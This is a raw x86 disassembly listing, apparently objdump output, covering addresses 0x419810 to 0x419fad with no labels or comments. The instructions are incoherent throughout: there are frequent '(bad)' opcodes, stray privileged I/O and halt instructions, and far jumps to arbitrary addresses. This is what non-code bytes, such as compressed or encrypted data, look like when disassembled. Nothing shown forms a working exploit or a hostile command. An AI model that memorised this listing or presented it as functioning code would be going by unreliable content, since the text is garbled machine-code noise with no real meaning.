  419810:	inc    esi
  419811:	data16 shr BYTE PTR ds:0x6b5915d8,0xe9
  419819:	test   dh,dl
  41981b:	pop    ds
  41981c:	jge    0x41986b
  41981e:	mov    eax,ds:0x9f02abc5
  419823:	in     eax,dx
  419824:	mov    bl,BYTE PTR [ecx+ebx*2+0x31]
  419828:	add    DWORD PTR [edi-0x51880ec6],esp
  41982e:	loopne 0x4197fd
  419830:	pop    esp
  419831:	dec    ebp
  419832:	push   ecx
  419833:	push   ss
  419834:	loope  0x41987d
  419836:	dec    ecx
  419837:	add    esi,DWORD PTR [edi-0x495db712]
  41983d:	xchg   esp,eax
  41983e:	xchg   esp,eax
  41983f:	mov    ch,0x37
  419841:	cli    
  419842:	mov    dl,0xff
  419844:	nop
  419845:	jns    0x4197c9
  419847:	adc    eax,0x3e55ee5d
  41984c:	js     0x4197f2
  41984e:	popa   
  41984f:	retf   0xdbe4
  419852:	add    BYTE PTR [edi-0x4c],ch
  419855:	in     al,0x72
  419857:	shl    DWORD PTR [ebx-0x6a],1
  41985a:	retf   
  41985b:	push   ebx
  41985c:	(bad)  
  41985d:	(bad)  
  41985e:	lock add bh,ch
  419861:	in     eax,0x62
  419863:	jbe    0x41984c
  419865:	mov    dh,0xc3
  419867:	fnsave ds:[edx]
  41986a:	repz jae 0x4198ea
  41986d:	daa    
  41986e:	jb     0x41986c
  419870:	es sub al,0xe6
  419873:	stos   BYTE PTR es:[edi],al
  419874:	inc    esp
  419875:	pop    esi
  419876:	jno    0x419808
  419878:	pop    es
  419879:	aaa    
  41987a:	jg     0x41988a
  41987c:	mov    cl,0x77
  41987e:	lds    eax,FWORD PTR [edi-0x64]
  419881:	cwde   
  419882:	aas    
  419883:	shr    BYTE PTR [ecx],1
  419885:	pop    ebp
  419886:	fld    TBYTE PTR [ecx-0x77276918]
  41988c:	push   0x10
  41988e:	mov    edx,0x4c79f515
  419893:	pushf  
  419894:	data16 loopne 0x419837
  419897:	mov    bl,0x75
  419899:	xchg   edi,eax
  41989a:	adc    edi,DWORD PTR [ebp+0x641b52e6]
  4198a0:	outs   dx,DWORD PTR ds:[esi]
  4198a1:	push   ebx
  4198a2:	mov    ch,0x4
  4198a4:	fisub  DWORD PTR [esi+0x70099150]
  4198aa:	cs push edi
  4198ac:	mov    al,0xca
  4198ae:	or     dl,BYTE PTR [eax+0x5dd3adc1]
  4198b4:	pop    eax
  4198b5:	dec    esp
  4198b6:	popf   
  4198b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198b8:	jge    0x4198c8
  4198ba:	jmp    0x419887
  4198bc:	into   
  4198bd:	lods   al,BYTE PTR ds:[esi]
  4198be:	retw   0x5403
  4198c2:	dec    edx
  4198c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198c4:	adc    al,0x52
  4198c6:	mov    al,BYTE PTR [edx+0x1cc2ec22]
  4198cc:	arpl   cx,bp
  4198ce:	dec    edx
  4198cf:	and    BYTE PTR [ebx+0x7],dh
  4198d2:	xchg   DWORD PTR [ecx-0x76],ebx
  4198d5:	iret   
  4198d6:	fisub  DWORD PTR [edi+ebx*8]
  4198d9:	mov    eax,0xa05c6651
  4198de:	mov    ds:0xc17277e8,al
  4198e3:	mov    bh,0x1f
  4198e5:	pusha  
  4198e6:	jp     0x419911
  4198e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4198e9:	mov    ebx,0xfb194216
  4198ee:	sbb    DWORD PTR [edx],0x51fbd1f7
  4198f4:	outs   dx,BYTE PTR ds:[esi]
  4198f5:	out    dx,eax
  4198f6:	outs   dx,DWORD PTR ds:[esi]
  4198f7:	sbb    DWORD PTR [ecx+0x4a],ebp
  4198fa:	pop    ebp
  4198fb:	xchg   esi,eax
  4198fc:	sti    
  4198fd:	dec    eax
  4198fe:	ss test al,0xea
  419901:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419902:	div    BYTE PTR [edx]
  419904:	call   0xe56:0xfb50df4
  41990b:	out    dx,al
  41990c:	adc    esi,edi
  41990e:	pop    ebp
  41990f:	cmp    edi,ecx
  419911:	jns    0x419970
  419913:	das    
  419914:	and    al,0x8f
  419916:	cmp    ah,BYTE PTR [edx]
  419918:	fwait
  419919:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41991a:	outs   dx,BYTE PTR ds:[esi]
  41991b:	shl    DWORD PTR [ebx],0xe3
  41991e:	sbb    al,0x3a
  419920:	sbb    esi,DWORD PTR [ebx-0x228dcf2d]
  419926:	xor    ebp,ecx
  419928:	and    al,0xec
  41992a:	stos   DWORD PTR es:[edi],eax
  41992b:	cmp    dl,BYTE PTR [eax+0x4a5ae479]
  419931:	push   es
  419932:	stos   DWORD PTR es:[edi],eax
  419933:	cli    
  419934:	push   ss
  419935:	inc    ebp
  419936:	pusha  
  419937:	xchg   esp,eax
  419938:	arpl   WORD PTR [ecx],bp
  41993a:	mov    ecx,0xaf28cfa1
  41993f:	mov    ds:0xda0c7f1a,eax
  419944:	sar    dl,0x49
  419947:	aas    
  419948:	dec    ebx
  419949:	addr16 mov esi,0x700672f0
  41994f:	and    al,ch
  419951:	sbb    esi,ebp
  419953:	js     0x419935
  419955:	retf   
  419956:	std    
  419957:	in     al,0x68
  419959:	mov    edx,0x121dccd2
  41995e:	add    eax,0xc0bf7eae
  419963:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419964:	sub    bh,cl
  419966:	loope  0x41996e
  419968:	(bad)
  41996b:	out    dx,al
  41996c:	shl    BYTE PTR [edx],0xa8
  41996f:	and    dl,BYTE PTR [ebx]
  419971:	pop    ebx
  419972:	inc    esp
  419973:	lahf   
  419974:	fild   WORD PTR [edx+0x27]
  419977:	pop    ebp
  419978:	jecxz  0x4199f0
  41997a:	jbe    0x4199f7
  41997c:	lds    esp,FWORD PTR [eax+0x1d1d0517]
  419982:	adc    BYTE PTR [eax+0x20],bh
  419985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419986:	cdq    
  419987:	and    DWORD PTR [ebx],edx
  419989:	mov    dh,0x4d
  41998b:	jo     0x41996a
  41998d:	cmp    ah,bl
  41998f:	sbb    al,0x93
  419991:	or     dh,0xbb
  419994:	ret    0xbbc2
  419997:	ss mov cl,0xb
  41999a:	cmc    
  41999b:	out    dx,al
  41999c:	jno    0x419a0a
  41999e:	test   DWORD PTR [ebp-0x9],0xef697bf0
  4199a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4199a6:	xor    al,ah
  4199a8:	mov    esi,0x64fd0e85
  4199ad:	cmp    BYTE PTR [ecx+0x57],al
  4199b0:	retf   
  4199b1:	shr    DWORD PTR [ebp-0x39],1
  4199b4:	imul   edi,DWORD PTR [esp+eiz*8-0x3c],0xffffffea
  4199b9:	jge    0x4199b5
  4199bb:	jmp    0x26c28988
  4199c0:	out    dx,al
  4199c1:	xchg   ebp,eax
  4199c2:	xor    eax,DWORD PTR [esi+0x3d]
  4199c5:	hlt    
  4199c6:	and    al,0xc
  4199c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4199c9:	add    DWORD PTR fs:[eax+0x3df22993],ebx
  4199d0:	mov    esp,0x42a01cec
  4199d5:	mov    ch,0x10
  4199d7:	jle    0x4199f5
  4199d9:	mov    ds:0x8c287fd4,eax
  4199de:	mov    WORD PTR ds:0x6e2f1c17,fs
  4199e4:	cmp    edi,DWORD PTR [ebx]
  4199e6:	xchg   ebx,eax
  4199e7:	mov    bl,0x77
  4199e9:	mov    eax,0x86148461
  4199ee:	fidiv  WORD PTR [ecx-0x17148f40]
  4199f4:	imul   ebp,esp,0x5aecb2
  4199fa:	leave  
  4199fb:	inc    esp
  4199fc:	aad    0x8f
  4199fe:	nop
  4199ff:	adc    DWORD PTR fs:[edx+0x7d],esp
  419a03:	add    DWORD PTR [eax],0xffffffc8
  419a06:	sub    DWORD PTR [esi+0x54809f09],ecx
  419a0c:	or     ebx,DWORD PTR [ebx]
  419a0e:	sti    
  419a0f:	jmp    0x4199d8
  419a11:	imul   BYTE PTR [edi]
  419a13:	mov    ecx,DWORD PTR [ebp-0x30]
  419a16:	or     eax,0xadd0e325
  419a1b:	xor    ebp,edx
  419a1d:	hlt    
  419a1e:	cdq    
  419a1f:	inc    esp
  419a20:	jecxz  0x419a27
  419a22:	adc    esp,0xfa30a5df
  419a28:	sub    bh,ch
  419a2a:	push   0x277c925a
  419a2f:	adc    cl,BYTE PTR [ecx+0x6f]
  419a32:	adc    ebx,esi
  419a34:	icebp  
  419a35:	push   es
  419a36:	xchg   edi,eax
  419a37:	in     al,dx
  419a38:	or     BYTE PTR [eax+0x72749492],dh
  419a3e:	nop
  419a3f:	pop    esp
  419a40:	pop    ds
  419a41:	adc    BYTE PTR [edx-0x683340f5],cl
  419a47:	jmp    0x2e24c0f1
  419a4c:	jg     0x419a60
  419a4e:	push   edx
  419a4f:	mov    dl,0x21
  419a51:	mov    eax,ds:0x12f81937
  419a56:	mov    BYTE PTR [esi+0x55],dl
  419a59:	jl     0x419a30
  419a5b:	inc    edx
  419a5c:	inc    eax
  419a5d:	(bad)  
  419a5e:	fldcw  WORD PTR [edi]
  419a60:	xchg   ebx,eax
  419a61:	adc    eax,0x2cad4193
  419a66:	mov    ?,WORD PTR [ebp+0x53]
  419a69:	adc    al,0xf2
  419a6b:	and    eax,0x8d085d3
  419a70:	mov    ch,BYTE PTR [edx]
  419a72:	fnstcw WORD PTR [edx-0x15238e8b]
  419a78:	(bad)  
  419a79:	nop
  419a7a:	xor    BYTE PTR [edi+0x1d0a3e1e],0x44
  419a81:	adc    eax,0x2b2db41a
  419a86:	pop    eax
  419a87:	leave  
  419a88:	bound  edx,QWORD PTR [eax+0x6b9a9053]
  419a8e:	fiadd  DWORD PTR [ebp+ebp*8+0x5a]
  419a92:	push   es
  419a93:	mov    al,ds:0x542ed81b
  419a98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419a99:	sbb    DWORD PTR [esi+0x478aada0],edx
  419a9f:	div    BYTE PTR ds:0x7a41b3bb
  419aa5:	jl     0x419a89
  419aa7:	ins    BYTE PTR es:[edi],dx
  419aa8:	dec    eax
  419aa9:	popf   
  419aaa:	dec    ecx
  419aab:	lahf   
  419aac:	stc    
  419aad:	repnz inc esi
  419aaf:	lods   eax,DWORD PTR ds:[esi]
  419ab0:	mov    ah,0x1d
  419ab2:	pop    ecx
  419ab3:	pop    ebx
  419ab4:	pcmpeqb mm3,QWORD PTR [ebx+0x5d]
  419ab8:	aad    0xb4
  419aba:	jl     0x419a81
  419abc:	data16 loope 0x419b0f
  419abf:	sbb    al,0xbe
  419ac1:	out    0x56,eax
  419ac3:	push   ss
  419ac4:	jmp    0x419ad8
  419ac6:	(bad)  
  419ac8:	imul   ecx,DWORD PTR [ebp+0x45bcacab],0x5117a454
  419ad2:	cmp    eax,0xaa8bade5
  419ad7:	(bad)  
  419ad9:	xchg   ebx,eax
  419ada:	xchg   BYTE PTR [edx],ch
  419adc:	xor    DWORD PTR [edi],0x4360800f
  419ae2:	mov    cl,0xb1
  419ae4:	call   0xd51bd8a
  419ae9:	clc    
  419aea:	lods   al,BYTE PTR ds:[esi]
  419aeb:	xchg   DWORD PTR [edx-0x53289835],edi
  419af1:	xchg   esi,eax
  419af2:	das    
  419af3:	pop    ecx
  419af4:	mov    eax,0x6198774d
  419af9:	pop    edi
  419afa:	je     0x419b4b
  419afc:	jg     0x419b56
  419afe:	and    ecx,ecx
  419b00:	add    ebx,edi
  419b02:	and    BYTE PTR [esi-0x43470948],dl
  419b08:	mov    al,dl
  419b0a:	add    DWORD PTR [ebp+0x10],0x9516cd29
  419b11:	pop    edx
  419b12:	hlt    
  419b13:	sti    
  419b14:	scas   eax,DWORD PTR es:[edi]
  419b15:	and    bh,ch
  419b17:	fsub   st(5),st
  419b19:	jge    0x419b0e
  419b1b:	jnp    0x419b00
  419b1d:	mov    ebp,0xffd783e3
  419b22:	daa    
  419b23:	test   eax,0xa39f8bd6
  419b28:	push   eax
  419b29:	adc    al,0xa9
  419b2b:	fs mov cs,edx
  419b2e:	or     DWORD PTR ds:0xf60641ca,edi
  419b34:	jecxz  0x419ad8
  419b36:	xchg   BYTE PTR [eax-0x1f4d4d53],bl
  419b3c:	ret    
  419b3d:	shr    DWORD PTR [esi],cl
  419b3f:	ret    0x3c5e
  419b42:	rol    DWORD PTR [ebx],1
  419b44:	pop    edx
  419b45:	jno    0x419b39
  419b47:	pop    esi
  419b48:	sub    dh,bl
  419b4a:	(bad)
  419b4d:	js     0x419af2
  419b4f:	and    al,0x9b
  419b51:	inc    ecx
  419b52:	(bad)  
  419b53:	cmp    cl,BYTE PTR [ecx+0x641ff0fd]
  419b59:	std    
  419b5a:	fnsave ss:[ecx+0x4d25ad30]
  419b61:	cmp    BYTE PTR [esi],dl
  419b63:	imul   esi,eax,0x83080ce
  419b69:	jl     0x419b9b
  419b6b:	das    
  419b6c:	lock repnz nop
  419b6f:	sti    
  419b70:	push   ds
  419b71:	arpl   bx,dx
  419b73:	inc    eax
  419b74:	js     0x419b6f
  419b76:	cwde   
  419b77:	cmp    BYTE PTR [edi+edi*4+0x35b221d6],ch
  419b7e:	or     edx,0x476ade13
  419b84:	pop    edx
  419b85:	mov    dh,0xe6
  419b87:	dec    ebp
  419b88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419b89:	mov    eax,0x4992da61
  419b8e:	jmp    0x3ea2:0x42fe1e33
  419b95:	mov    ecx,0x37bdf68c
  419b9a:	mov    bh,0xa8
  419b9c:	loope  0x419c18
  419b9e:	push   es
  419b9f:	pcmpgtw mm4,mm6
  419ba2:	fwait
  419ba3:	in     eax,dx
  419ba4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419ba5:	lea    eax,[eax+0x184f05bb]
  419bab:	and    esi,DWORD PTR [ebx+ebp*8]
  419bae:	xor    ch,dl
  419bb0:	mov    al,BYTE PTR [edx-0x4affc1e0]
  419bb6:	inc    edi
  419bb7:	xor    ch,BYTE PTR [ebp-0x7b39b2ae]
  419bbd:	lods   al,BYTE PTR ds:[esi]
  419bbe:	xchg   ebp,eax
  419bbf:	imul   ecx,esp,0x17
  419bc2:	(bad)  
  419bc3:	jp     0x419c32
  419bc5:	mov    ah,0x52
  419bc7:	push   ebx
  419bc8:	loopne 0x419bb3
  419bca:	ds in  al,dx
  419bcc:	and    DWORD PTR [ebx+eiz*1],edx
  419bcf:	in     al,0xcf
  419bd1:	sahf   
  419bd2:	mov    ecx,0xc491fd25
  419bd7:	cmp    al,0x92
  419bd9:	mov    edx,0x47c4d8c2
  419bde:	mov    ch,0x48
  419be0:	mov    cl,0x1c
  419be2:	push   ecx
  419be3:	(bad)  
  419be5:	mov    bh,BYTE PTR [ebp+0x74]
  419be8:	outs   dx,DWORD PTR ds:[esi]
  419be9:	(bad)  
  419beb:	les    ecx,FWORD PTR [edi]
  419bed:	mov    dl,0xb5
  419bef:	push   ecx
  419bf0:	pop    ebp
  419bf1:	ins    DWORD PTR es:[edi],dx
  419bf2:	dec    esi
  419bf3:	sbb    al,0x78
  419bf5:	fst    QWORD PTR [eax-0x293b4861]
  419bfb:	inc    ebp
  419bfc:	xor    ah,BYTE PTR [esi]
  419bfe:	mov    ebx,0xe0919927
  419c03:	sar    BYTE PTR [esi+0x5c6d75d5],0x1a
  419c0a:	cmc    
  419c0b:	sub    BYTE PTR [esi+0x6a],bh
  419c0e:	cwde   
  419c0f:	push   0x6653bf0c
  419c14:	std    
  419c15:	jns    0x419be6
  419c17:	enter  0xcb2d,0xd9
  419c1b:	mov    eax,ds:0xceb611cb
  419c20:	fsubr  QWORD PTR [ebp+0x4ae6ba61]
  419c26:	add    DWORD PTR ds:0x3b957d2,edx
  419c2c:	xor    eax,0xc113da5b
  419c31:	and    dl,dl
  419c33:	mov    ah,BYTE PTR [ebx-0x26]
  419c36:	repz neg DWORD PTR [edx]
  419c39:	cmc    
  419c3a:	dec    ebp
  419c3b:	out    dx,al
  419c3c:	popa   
  419c3d:	jbe    0x419c74
  419c3f:	in     eax,dx
  419c40:	push   ebp
  419c41:	xchg   ebp,eax
  419c42:	xlat   BYTE PTR ds:[ebx]
  419c43:	inc    ebx
  419c44:	ins    DWORD PTR es:[edi],dx
  419c45:	jg     0x419c11
  419c47:	inc    ecx
  419c48:	mov    dh,0x8
  419c4a:	push   edi
  419c4b:	jo     0x419c8a
  419c4d:	test   DWORD PTR [esi+eiz*4],edi
  419c50:	sub    DWORD PTR [ecx+0x74],0x43
  419c54:	mov    al,0x61
  419c56:	cmp    edx,DWORD PTR [edx+eiz*4+0x385e3e2d]
  419c5d:	cld    
  419c5e:	push   edi
  419c5f:	fsubr  QWORD PTR [esp+eiz*8]
  419c62:	mov    esp,DWORD PTR [esi+0x1b83a3f5]
  419c68:	je     0x419bea
  419c6a:	sub    esp,DWORD PTR gs:[eax-0x52]
  419c6e:	fbstp  TBYTE PTR [edi-0x4e4d4223]
  419c74:	iret   
  419c75:	test   BYTE PTR [ecx],ah
  419c77:	sub    esi,ebp
  419c79:	or     ecx,esp
  419c7b:	retf   
  419c7c:	add    eax,0x34fc2e87
  419c81:	cmp    eax,0x5cf4d616
  419c86:	mov    edx,0xb34df108
  419c8b:	sub    BYTE PTR [edi+0x640616da],ah
  419c91:	cmp    edi,edi
  419c93:	adc    eax,0xafa66918
  419c98:	jne    0x419cc4
  419c9a:	imul   eax,DWORD PTR [ebx+edi*2],0xc47e1d60
  419ca1:	pop    esi
  419ca2:	pop    ebx
  419ca3:	mov    ds:0x302371f8,al
  419ca8:	mov    ecx,0xc1d3a54e
  419cae:	add    DWORD PTR [eax-0x838b5db],ebp
  419cb4:	hlt    
  419cb5:	adc    al,0xab
  419cb7:	push   ebx
  419cb8:	outs   dx,BYTE PTR ds:[esi]
  419cb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cba:	xchg   ebp,eax
  419cbb:	dec    edx
  419cbc:	pop    ecx
  419cbd:	cmp    al,0xed
  419cbf:	jmp    0xb0a96798
  419cc4:	lea    edx,[edi+0x1]
  419cc7:	ja     0x419c65
  419cc9:	dec    esp
  419cca:	hlt    
  419ccb:	inc    esi
  419ccc:	or     DWORD PTR [edi-0x54],0xfe2d47af
  419cd3:	pop    ebx
  419cd4:	loope  0x419d00
  419cd6:	mov    ah,0xe0
  419cd8:	jle    0x419c67
  419cda:	shr    BYTE PTR fs:[ebp+0x2f7ffb25],1
  419ce1:	js     0x419ce9
  419ce3:	pop    eax
  419ce4:	out    0x4c,eax
  419ce6:	cwde   
  419ce7:	out    0xdf,eax
  419ce9:	xor    eax,0x6377b43c
  419cee:	out    0x3d,al
  419cf0:	lods   eax,DWORD PTR ds:[esi]
  419cf1:	in     al,0x39
  419cf3:	mov    eax,ds:0x17308d35
  419cf8:	pop    ds
  419cf9:	popf   
  419cfa:	in     al,dx
  419cfb:	cmp    ah,dh
  419cfd:	mov    edi,0x96dd0f8f
  419d02:	les    ebp,FWORD PTR [edx]
  419d04:	cmp    BYTE PTR [eax],al
  419d06:	or     eax,0x8e53e338
  419d0b:	push   edx
  419d0c:	lahf   
  419d0d:	pop    edi
  419d0e:	dec    edi
  419d0f:	mov    ds:0x1af1f6c2,eax
  419d14:	inc    ebp
  419d15:	loopne 0x419d91
  419d17:	retf   0x73f5
  419d1a:	imul   esi,esi,0x760b13d8
  419d20:	nop
  419d21:	mov    bl,0xfc
  419d23:	daa    
  419d24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419d25:	mov    esp,edi
  419d27:	test   BYTE PTR ds:0xc7f310d7,cl
  419d2d:	into   
  419d2e:	sti    
  419d2f:	fdiv   DWORD PTR [edx-0x7ad1c7ad]
  419d35:	push   edi
  419d36:	inc    ebx
  419d37:	mov    ?,WORD PTR [esi+0x78dff691]
  419d3d:	in     al,dx
  419d3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419d3f:	sub    esp,DWORD PTR ds:0x1ace3387
  419d45:	lahf   
  419d46:	fiadd  WORD PTR [edi-0x6a574681]
  419d4c:	and    al,0x98
  419d4e:	cld    
  419d4f:	(bad)  
  419d51:	pop    esp
  419d52:	int    0x68
  419d54:	hlt    
  419d55:	xor    al,0x80
  419d57:	gs jbe 0x419d31
  419d5a:	mov    ebp,0xa77ebde7
  419d5f:	jecxz  0x419d25
  419d61:	in     eax,0x34
  419d63:	add    eax,DWORD PTR [edi-0x49]
  419d66:	push   0x12e45f70
  419d6b:	dec    edx
  419d6c:	sub    al,0x6f
  419d6e:	mov    edi,0xe8263696
  419d73:	imul   eax,DWORD PTR [ebx],0xdaefabb8
  419d79:	cdq    
  419d7a:	ins    BYTE PTR es:[edi],dx
  419d7b:	jmp    0x8202448b
  419d80:	mov    dh,0xd7
  419d82:	fcomp  DWORD PTR [ebx-0xc]
  419d85:	pusha  
  419d86:	jle    0x419dbe
  419d88:	and    ah,dh
  419d8a:	ja     0x419d4e
  419d8c:	cmp    al,0x16
  419d8e:	jns    0x419df9
  419d90:	ja     0x419df5
  419d92:	mov    esi,0x7997e5a1
  419d97:	clc    
  419d98:	mov    edi,0x54471f20
  419d9d:	repz sar BYTE PTR [edi+0x34],0xba
  419da2:	mov    ebx,esi
  419da4:	sahf   
  419da5:	cdq    
  419da6:	into   
  419da7:	js     0x419d70
  419da9:	loopne 0x419dff
  419dab:	pop    eax
  419dac:	repnz test al,dl
  419daf:	out    0xd2,al
  419db1:	(bad)  
  419db2:	mov    ebx,0x633d2d97
  419db7:	mov    ah,0xa2
  419db9:	in     al,dx
  419dba:	sub    al,0x1e
  419dbc:	int3   
  419dbd:	sub    DWORD PTR [ebx],eax
  419dbf:	inc    esp
  419dc0:	lods   eax,DWORD PTR ds:[esi]
  419dc1:	add    DWORD PTR [edx-0x3476a6d],0x1f
  419dc8:	pop    ds
  419dc9:	iret   
  419dca:	in     eax,dx
  419dcb:	adc    BYTE PTR [edx+edi*8-0x3c719471],bh
  419dd2:	jmp    0x419d56
  419dd4:	pushf  
  419dd5:	jae    0x419dbb
  419dd7:	scas   al,BYTE PTR es:[edi]
  419dd8:	jge    0x419dfa
  419dda:	dec    ecx
  419ddb:	xchg   ebp,eax
  419ddc:	jb     0x419d94
  419dde:	nop
  419ddf:	dec    ecx
  419de0:	and    edx,DWORD PTR [edi-0x2d]
  419de3:	std    
  419de4:	ja     0x419d94
  419de6:	sub    eax,0x4d342fc5
  419deb:	daa    
  419dec:	inc    esi
  419ded:	ins    DWORD PTR es:[edi],dx
  419dee:	add    ch,BYTE PTR [eax+esi*8+0x5c]
  419df2:	scas   eax,DWORD PTR es:[edi]
  419df3:	pop    ebp
  419df4:	sti    
  419df5:	mov    ds:0xe5505b19,al
  419dfa:	adc    BYTE PTR [esi],bh
  419dfc:	js     0x419e20
  419dfe:	inc    eax
  419dff:	lods   eax,DWORD PTR ds:[esi]
  419e00:	in     eax,dx
  419e01:	outs   dx,BYTE PTR ds:[esi]
  419e02:	icebp  
  419e03:	out    dx,al
  419e04:	sbb    BYTE PTR [edx+0x55],ch
  419e07:	daa    
  419e08:	rcl    dh,cl
  419e0a:	shl    BYTE PTR [edx+0x5d8b58e1],0x55
  419e11:	push   0x2b
  419e13:	inc    ebp
  419e14:	repnz dec esp
  419e16:	sub    eax,DWORD PTR [edi]
  419e18:	xor    DWORD PTR [eax-0x3e],0x4ec96101
  419e1f:	cli    
  419e20:	push   ebp
  419e21:	mov    eax,0xf575244a
  419e26:	cmp    al,0x6b
  419e28:	ret    0xbb85
  419e2b:	cld    
  419e2c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e2d:	xor    DWORD PTR [ebx+0x30aa42cf],edx
  419e33:	imul   edx,edx,0xa
  419e36:	cs sbb eax,0xe619781
  419e3c:	xchg   edi,eax
  419e3d:	fild   QWORD PTR [eax+0x393d5780]
  419e43:	sbb    DWORD PTR [edi-0x3d],0xb6495ed9
  419e4a:	cmp    al,ch
  419e4c:	mov    eax,ds:0x205b680f
  419e51:	shr    BYTE PTR [edx],0xb4
  419e54:	(bad)  
  419e55:	ds push esp
  419e57:	int    0xb3
  419e59:	cmc    
  419e5a:	inc    ecx
  419e5b:	add    al,0xc5
  419e5d:	fmulp  st(1),st
  419e5f:	adc    eax,0x1aade046
  419e64:	jmp    0x7bb5f641
  419e69:	sbb    eax,0xf63a89f9
  419e6e:	outs   dx,DWORD PTR ds:[esi]
  419e6f:	jg     0x419ec1
  419e71:	pop    edx
  419e72:	daa    
  419e73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e74:	push   edi
  419e75:	push   0xffffff96
  419e77:	pop    edi
  419e78:	xor    BYTE PTR ds:[ebp-0x11c08242],cl
  419e7f:	iret   
  419e80:	inc    ebp
  419e81:	dec    edx
  419e82:	xchg   ecx,eax
  419e83:	mov    eax,0xf89e1d8f
  419e88:	iret   
  419e89:	mov    ah,0xe8
  419e8b:	jmp    0x419e6d
  419e8d:	push   ecx
  419e8e:	jmp    0x419e87
  419e90:	mov    dl,0x7
  419e92:	loopne 0x419ebf
  419e94:	xor    al,0x72
  419e96:	mov    ebp,0x6b001d95
  419e9b:	cmp    ebp,ebp
  419e9d:	outs   dx,DWORD PTR ds:[esi]
  419e9e:	adc    al,0xfe
  419ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ea1:	js     0x419efc
  419ea3:	mov    ecx,0x7c56bfba
  419ea8:	(bad)  
  419ea9:	loop   0x419e55
  419eab:	and    BYTE PTR [edi+ecx*1-0x25],ch
  419eaf:	push   esp
  419eb0:	inc    esi
  419eb1:	int3   
  419eb2:	loope  0x419ebd
  419eb4:	lock fnsave [eax]
  419eb7:	inc    ebx
  419eb8:	inc    edx
  419eb9:	repnz cli 
  419ebb:	adc    al,0xeb
  419ebd:	into   
  419ebe:	out    dx,al
  419ebf:	cs std 
  419ec1:	jno    0x419e56
  419ec3:	pop    es
  419ec4:	pop    esp
  419ec5:	push   0xffffffc8
  419ec7:	adc    BYTE PTR [ebx-0x724fada8],cl
  419ecd:	stc    
  419ece:	mov    eax,ds:0x71582a6d
  419ed3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ed4:	scas   eax,DWORD PTR es:[edi]
  419ed5:	jno    0x419f24
  419ed7:	std    
  419ed8:	into   
  419ed9:	(bad)  
  419eda:	cli    
  419edb:	and    BYTE PTR [edi+0x1324b5de],cl
  419ee1:	jae    0x419efb
  419ee3:	xchg   BYTE PTR [edi],ch
  419ee5:	fcmove st,st(3)
  419ee7:	pop    eax
  419ee8:	pop    DWORD PTR [esi+0x1f62d844]
  419eee:	mov    ah,0x99
  419ef0:	jmp    0x7ba976a4
  419ef5:	sub    ebp,DWORD PTR [edi]
  419ef7:	and    DWORD PTR [ecx-0x58],esi
  419efa:	stos   DWORD PTR es:[edi],eax
  419efb:	mov    bl,0x6
  419efd:	stos   BYTE PTR es:[edi],al
  419efe:	es add al,0x28
  419f01:	jnp    0x419e97
  419f03:	mov    eax,0x42f36f65
  419f08:	mov    edx,0xc7e6e096
  419f0d:	das    
  419f0e:	in     al,0xb6
  419f10:	push   esi
  419f11:	data16 int3 
  419f13:	ret    0x8d87
  419f16:	inc    ecx
  419f17:	sbb    al,0x18
  419f19:	xchg   edx,eax
  419f1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f1b:	adc    al,0xb1
  419f1d:	mov    dh,0x4e
  419f1f:	add    al,0xf2
  419f21:	push   ss
  419f22:	clc    
  419f23:	mov    eax,ds:0x3c66e8ff
  419f28:	mov    edi,0xf326cb87
  419f2d:	and    cl,bl
  419f2f:	xor    al,0x4e
  419f31:	pop    esi
  419f32:	push   0xe12077d
  419f37:	fldcw  WORD PTR [edx]
  419f39:	pop    ds
  419f3a:	mov    al,0xd5
  419f3c:	pushf  
  419f3d:	adc    bl,bh
  419f3f:	test   BYTE PTR [esi-0x29],0xea
  419f43:	jb     0x419f21
  419f45:	jne    0x419ef6
  419f47:	popf   
  419f48:	mov    es:0x4c7d35b8,al
  419f4e:	and    DWORD PTR [eax+0x67],0x18c7acbf
  419f55:	cmc    
  419f56:	adc    ecx,DWORD PTR [ebp+0x1f]
  419f59:	test   cl,al
  419f5b:	push   0x3d
  419f5d:	jge    0x419f83
  419f5f:	call   0x224b685a
  419f64:	cmp    DWORD PTR [esi+ecx*1],0x74
  419f68:	pop    ds
  419f69:	scas   al,BYTE PTR es:[edi]
  419f6a:	test   DWORD PTR [edx+0x507309cf],ebp
  419f70:	lahf   
  419f71:	mov    ebx,ecx
  419f73:	lods   eax,DWORD PTR ds:[esi]
  419f74:	outs   dx,BYTE PTR ds:[esi]
  419f75:	push   eax
  419f76:	divps  xmm7,XMMWORD PTR [ecx+0x7]
  419f7a:	dec    ebx
  419f7b:	and    dl,ch
  419f7d:	dec    edi
  419f7e:	fsub   QWORD PTR [ebp+0x7a]
  419f81:	add    bl,ch
  419f83:	enter  0xc8f4,0xdb
  419f87:	push   cs
  419f88:	lods   eax,DWORD PTR ds:[esi]
  419f89:	xchg   ch,ah
  419f8b:	sbb    bh,dh
  419f8d:	push   0x9049600c
  419f92:	dec    ebx
  419f93:	or     al,0x40
  419f95:	xchg   ebp,eax
  419f96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f97:	cmc    
  419f98:	jae    0x419ff4
  419f9a:	sbb    dl,al
  419f9c:	cmp    eax,0x8dfc9b91
  419fa1:	das    
  419fa2:	in     al,dx
  419fa3:	or     eax,0x8a28e0f8
  419fa8:	jge    0x419f46
  419faa:	jo     0x419f69
  419fac:	pop    esi
  419fad:	jp     0x419fdb
